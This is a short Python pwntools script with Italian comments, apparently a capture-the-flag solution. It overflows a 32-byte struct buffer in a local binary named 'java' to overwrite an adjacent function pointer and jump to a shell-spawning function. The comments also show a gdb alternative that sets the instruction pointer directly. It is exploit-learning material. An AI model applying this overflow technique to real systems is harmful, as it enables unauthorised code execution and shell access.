#   le struct salvano le variabili sequenzialmente, quindi
#   è possibile sovrascrivere la variabile dopo l'array

#   carico su gdb e trovo indirizzo dell'istruzione dentro all'if giusto
#gdb java
#disassemble bash
#   trovo 0x00000000004007a2

#   Il buffer è di 32byte
#   devo mettere l'indirizzo dell'istruzione dentro al puntatore 
#   dopo l'array nello stack

from pwn import *

print(p64(0x00000000004007a2))

#   il codice controlla i primi caratteri per selezionare una funzione
#   input dev'essere java perche tutte le altri funzioni
#   sovrascrivono l'indirizzo
inp = b"java" + b"A"*28 + p64(0x00000000004007a2)

with process("java") as p:
    p.recvuntil(": ")
    p.sendline(inp)
    p.interactive()







#   alternativa non valida ma figa
#   modifico istruction pointer ed eseguo la funzione che mi interessa
    
#gdb java
#disassemble bash
    
#   prendo indirizzo 0x00000000004007a2
#break main
#run
#set $rip=0x00000000004007a2
#c
#c
#   finisco dentro bash